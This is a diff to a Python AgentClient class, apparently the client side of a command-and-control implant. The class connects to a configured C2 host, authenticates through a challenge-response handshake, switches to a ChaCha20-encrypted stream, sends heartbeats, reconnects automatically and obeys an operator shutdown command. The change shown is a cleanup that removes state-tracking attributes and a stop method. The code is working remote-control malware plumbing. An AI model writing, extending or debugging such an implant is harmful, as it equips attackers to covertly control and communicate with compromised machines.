@@ -51,27 +51,16 @@ class AgentClient:
         self._reconnect_initial = reconnect_initial
         self._reconnect_max = reconnect_max
         self._reader = PacketReader()
-        self._connected = False
         self._on_packet: Optional[Callable] = None
-        self._writer: Optional[asyncio.StreamWriter] = None
-        self._stream: Optional[EncryptedStream] = None
         self._write_lock = asyncio.Lock()
         self._hb_task: Optional[asyncio.Task] = None
         self._stopped = False
         self._next_request_id = 1
 
-    @property
-    def write_lock(self) -> asyncio.Lock:
-        return self._write_lock
-
     def set_packet_handler(self, handler) -> None:
         self._on_packet = handler
         if handler is not None and hasattr(handler, '_write_lock'):
             handler._write_lock = self._write_lock
-
-    @property
-    def connected(self) -> bool:
-        return self._connected
 
     def next_request_id(self) -> int:
         rid = self._next_request_id
@@ -87,7 +76,6 @@ class AgentClient:
                 raise
             except Exception as e:
                 logger.warning(f"connection error: {e}")
-            self._connected = False
             if self._stopped:
                 return
             try:
@@ -100,20 +88,8 @@ class AgentClient:
         """Called by Handler on CMD_SHUTDOWN: stop reconnect loop and exit."""
         self._stopped = True
 
-    async def stop(self) -> None:
-        self._stopped = True
-        if self._hb_task is not None:
-            self._hb_task.cancel()
-            try:
-                await self._hb_task
-            except (asyncio.CancelledError, Exception):
-                pass
-        if self._writer is not None:
-            self._writer.close()
-
     async def _connect_and_serve(self) -> None:
         reader, writer = await asyncio.open_connection(self._c2_host, self._c2_port)
-        self._writer = writer
         self._reader = PacketReader()
         if self._on_packet is not None and hasattr(self._on_packet, "reset"):
             self._on_packet.reset()
@@ -127,18 +103,15 @@ class AgentClient:
         if not await self._handshake(reader, writer, tx):
             logger.warning("registration handshake failed")
             writer.close()
-            self._writer = None
             return
         # Handshake + auth succeeded: the whole byte stream is now encrypted.
         stream = EncryptedStream(reader, writer, tx, rx)
-        self._stream = stream
         stream.absorb_leftover(self._reader)
         if self._reader.buffered:
             leftover = self._reader.drain_all()
             if self._on_packet is not None:
                 self._on_packet.feed(leftover)
                 await self._on_packet.process(stream, stream)
-        self._connected = True
         logger.info(f"connected to C2 at {self._c2_host}:{self._c2_port}")
 
         self._hb_task = asyncio.create_task(self._heartbeat_loop(stream))
@@ -153,7 +126,6 @@ class AgentClient:
                 self._on_packet.feed(chunk)
                 await self._on_packet.process(stream, stream)
         finally:
-            self._connected = False
             if self._hb_task is not None:
                 self._hb_task.cancel()
                 try:
@@ -162,8 +134,6 @@ class AgentClient:
                     pass
                 self._hb_task = None
             writer.close()
-            self._writer = None
-            self._stream = None
 
     async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, tx: ChaCha20) -> bool:
         """Challenge-response registration with the C2.
